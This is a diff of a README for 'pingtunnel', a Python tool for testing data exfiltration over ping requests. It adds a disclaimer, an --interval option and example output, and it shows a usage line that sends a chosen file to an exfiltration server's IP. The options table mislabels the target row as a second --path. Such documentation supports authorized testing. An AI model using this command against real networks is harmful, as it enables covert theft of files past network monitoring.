@@ -1,3 +1,7 @@
+# Disclaimer
+
+Usage of this tool for educational or authorized use only and at your own responsibility.
+
 # Description
 
 Test possible data exfiltration through ping requests
@@ -10,12 +14,13 @@ Test possible data exfiltration through ping requests
 
 **From command line:**
 
-`python -m pingtunnel --path PATH --target TARGET`
+`python -m pingtunnel --path PATH --target TARGET --interval INTERVAL`
 
 | Option | Short | Type | Default | Description |
 |---|---|---|---|---|
 |--path | -p | String | - | Path to file to be exfiltrated |
 |--path | -p | String | - | IP of exfiltration server |
+|--interval | -i | Float | 1.0 | Nr of seconds between pings |
 
 
 # Example
@@ -44,6 +49,7 @@ Status
 
   Total Number of Bytes: 1094
 Number of Ping Requests: 35.0
+ Interval between Pings: 1.0 seconds
 
 
 Execution
